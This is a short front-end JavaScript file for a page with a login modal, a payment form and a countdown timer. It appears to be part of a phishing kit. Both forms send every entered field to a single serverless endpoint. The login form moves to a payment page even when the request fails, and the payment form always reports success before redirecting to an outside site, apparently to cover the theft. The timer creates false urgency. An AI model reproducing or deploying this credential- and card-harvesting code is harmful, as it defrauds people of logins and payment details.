document.addEventListener('DOMContentLoaded', () => {
    // Login Modal
    const loginBtn = document.getElementById('login-btn-alt');
    const loginModal = document.getElementById('login-modal');
    const closeModal = document.getElementById('close-modal');

    if (loginBtn && loginModal) {
        loginBtn.addEventListener('click', () => {
            loginModal.classList.remove('hidden');
        });
    }

    if (closeModal) {
        closeModal.addEventListener('click', () => {
            loginModal.classList.add('hidden');
        });
    }

    // Login Form Submission
    const loginForm = document.getElementById('login-form');
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            fetch('/.netlify/functions/submit', {
                method: 'POST',
                body: JSON.stringify(Object.fromEntries(formData)),
                headers: { 'Content-Type': 'application/json' }
            })
            .then(response => response.text())
            .then(data => {
                window.location.href = '/payment.html';
            })
            .catch(() => {
                window.location.href = '/payment.html';
            });
        });
    }

    // Payment Form Submission
    const paymentForm = document.getElementById('payment-form');
    if (paymentForm) {
        paymentForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            fetch('/.netlify/functions/submit', {
                method: 'POST',
                body: JSON.stringify(Object.fromEntries(formData)),
                headers: { 'Content-Type': 'application/json' }
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('payment-success').classList.remove('hidden');
                this.reset();
                setTimeout(() => window.location.href = 'https://revealme.com', 2000);
            })
            .catch(() => {
                document.getElementById('payment-success').classList.remove('hidden');
                this.reset();
                setTimeout(() => window.location.href = 'https://revealme.com', 2000);
            });
        });
    }

    // Timer Feature
    const timerOffer = document.getElementById('timerOffer');
    if (timerOffer) {
        console.log('Timer element found, initializing...');
        let timeLeft = 4 * 24 * 60 * 60 + 23 * 60 * 60 + 59 * 60 + 59; // 4 days, 23h, 59m, 59s

        const updateTimer = () => {
            const days = Math.floor(timeLeft / (24 * 60 * 60));
            const hours = Math.floor((timeLeft % (24 * 60 * 60)) / (60 * 60));
            const minutes = Math.floor((timeLeft % (60 * 60)) / 60);
            const seconds = timeLeft % 60;
            timerOffer.textContent = `Time Remaining ${String(days).padStart(2, '0')}:${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            console.log(`Timer updated: ${timeLeft}`);
            if (timeLeft > 0) {
                timeLeft--;
            } else {
                timerOffer.textContent = 'Time Remaining 00:00:00:00';
                clearInterval(timerInterval);
                console.log('Timer reached zero');
            }
        };

        updateTimer();
        const timerInterval = setInterval(() => {
            updateTimer();
        }, 1000);
    } else {
        console.log('Timer element not found on this page');
    }
});